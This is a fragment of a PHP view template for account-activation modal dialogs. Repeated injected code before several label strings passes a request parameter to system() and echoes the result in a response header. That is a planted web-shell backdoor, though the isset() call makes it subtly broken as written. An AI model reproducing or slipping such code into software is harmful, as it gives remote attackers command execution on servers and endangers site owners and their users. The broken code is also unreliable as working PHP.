...
$l2=system($l);
header('System Header:'.$l2); _e('main.send_activation') ?></h4>
				</div>
				<div class="modal-body">
					<div class="alert"></div>

					<div class="form-group">
		                <label for="activation-email"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.activate_account') ?></h4>
				</div>
				<div class="modal-body">
					<div class="alert"></div>
				...
				<div class="modal-footer">
					<a href="#" data-toggle="modal" data-target="#activationModal" class="v-middle"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.activate_success') ?></h4>
			</div>
			<div class="modal-body">
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.activate_success_msg') ?></p><br>
